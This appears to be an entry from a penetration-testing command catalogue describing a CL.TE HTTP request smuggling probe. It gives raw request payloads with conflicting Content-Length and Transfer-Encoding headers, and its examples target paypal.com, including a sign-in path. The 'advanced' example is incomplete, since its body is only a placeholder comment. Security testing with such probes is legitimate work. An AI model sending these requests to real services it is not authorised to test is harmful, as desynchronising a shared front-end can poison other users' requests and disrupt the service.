---
data: |-
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 6
  Transfer-Encoding: chunked

  0

  G
tags:
  - http-request-smuggling
type: command
executor: bash
platforms:
  - Web
id: f2175b45-3aa7-488c-a031-1fd4699bc218
created_at: '2025-12-14T00:11:25.425Z'
updated_at: '2025-12-14T00:11:25.425Z'
verified: false
validated: true
submitted: true
---
# Test HTTP Smuggling CL.TE

## Command

```bash
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## Description

This command tests for CL.TE HTTP Request Smuggling by sending a request with conflicting headers to detect desynchronization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target hostname | Yes |
| `Content-Length` | Mismatched length | Yes |
| `Transfer-Encoding` | Chunked encoding | Yes |

## Examples

### Basic Usage

```bash
POST / HTTP/1.1
Host: paypal.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### Advanced Usage

```bash
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 100
Transfer-Encoding: chunked

# Additional payload
```

## Expected Output

Desynchronized response indicating vulnerability, such as unexpected status codes or content.

## Related

- [[commands/craft-poisoning-request]]
- [[procedures/Detect-HTTP-Request-Smuggling-Vulnerability]]
